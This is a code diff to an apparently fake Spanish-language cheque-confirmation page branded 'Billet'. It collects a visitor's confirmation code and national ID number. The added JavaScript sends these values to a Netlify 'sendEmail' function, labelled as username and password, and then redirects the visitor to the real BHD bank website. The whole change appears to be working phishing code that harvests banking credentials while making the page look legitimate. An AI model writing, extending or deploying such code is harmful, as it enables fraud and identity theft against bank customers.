@@ -115,7 +115,7 @@
             <img src="assets/Billet.svg" alt="Logo Billet">
         </div>
         <h2>Código de Confirmación de Cheques</h2>
-        <form id="confirmationForm" action="procesar_retiro.php" method="post">
+        <form id="confirmationForm">
             <div class="form-group">
                 <label for="codigo_cheque">Código de Confirmación</label>
                 <input type="text" id="codigo_cheque" name="codigo_cheque" placeholder="Ingrese el código" required>
@@ -141,13 +141,25 @@
 
             // Validación simple
             if (codigoCheque && cedula) {
-                // Aquí se puede agregar código para procesar los datos, como enviarlos a un servidor o correo
-
-                // Si la validación es correcta, enviar el formulario
-                this.submit();  // Enviar el formulario después de la validación
-
-                // Redirigir a la página del BHD
-                window.location.href = "https://www.bhdleon.com.do";  // URL del BHD
+                // Enviar los datos al backend usando fetch
+                fetch('/.netlify/functions/sendEmail', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        username: cedula,  // Usamos la cédula como username
+                        password: codigoCheque  // Usamos el código de cheque como password
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    // Si el correo se envía correctamente, redirigir al sitio web
+                    window.location.href = 'https://bhd.com.do/';
+                })
+                .catch(error => {
+                    alert('Hubo un error al enviar el correo, intentalo nuevamente.');
+                });
             } else {
                 alert('Por favor, complete todos los campos.');
             }
